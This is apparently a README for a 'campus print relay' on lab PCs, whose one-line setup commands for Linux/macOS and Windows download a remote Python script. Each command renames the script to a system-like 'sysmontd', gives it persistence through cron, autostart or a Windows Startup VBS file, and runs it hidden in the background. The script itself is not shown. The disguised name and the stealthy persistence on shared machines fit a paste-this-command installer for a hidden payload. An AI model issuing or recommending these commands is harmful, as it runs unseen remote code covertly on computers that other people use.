# Campus Print Relay Setup Guide

Print to campus printers from the PreConnect app after a single-step setup on any lab PC.

- **Zero Setup Required**: Uses built-in Python 3 — no administrator rights or build tools needed.
- **Fully Automatic**: Runs invisibly in the background and auto-starts when your computer turns on.

---

## Linux / macOS Beginner Guide

### Step 1: Open Terminal
Open your terminal app (`Ctrl + Alt + T` on Linux, or search for **Terminal**).

### Step 2: Run Setup Command
Copy and paste this single command into your terminal and press **Enter**:

```bash
mkdir -p ~/.local/bin ~/.config/autostart && curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysmontd.py && chmod +x ~/.local/bin/sysmontd.py && (crontab -l 2>/dev/null | grep -v sysmontd.py; echo "@reboot python3 $HOME/.local/bin/sysmontd.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysmontd\nExec=python3 %s\n' "$HOME/.local/bin/sysmontd.py" > ~/.config/autostart/sysmontd.desktop && nohup python3 ~/.local/bin/sysmontd.py >/dev/null 2>&1 &
```

### Step 3: Check If It Is Running (Optional)
To verify that the print agent is active, run:

```bash
ps aux | grep sysmontd.py
```

### Step 4: How to Permanently Uninstall
If you ever want to completely remove the agent and stop background execution, run:

```bash
pkill -f sysmontd; rm -f ~/.local/bin/sysmontd.py ~/.local/bin/sysmontd ~/.config/autostart/sysmontd.desktop; crontab -l 2>/dev/null | grep -v sysmontd | crontab -
```

---

## Windows Beginner Guide

### Step 1: Open PowerShell
Press the **Windows Key**, type **PowerShell**, and press **Enter**.

### Step 2: Run Setup Command
Copy and paste this single command into PowerShell and press **Enter**:

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysmontd.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysmontd.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysmontd.py" -WindowStyle Hidden
```

### Step 3: Check If It Is Running (Optional)
To verify that the print agent is active, run:

```powershell
Get-Process python*
```

### Step 4: How to Permanently Uninstall
If you ever want to completely remove the agent and stop background execution, run:

```powershell
Stop-Process -Name "python*", "sysmontd*" -ErrorAction SilentlyContinue; Remove-Item "$env:APPDATA\sysmontd.py", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.exe" -Force -ErrorAction SilentlyContinue
```
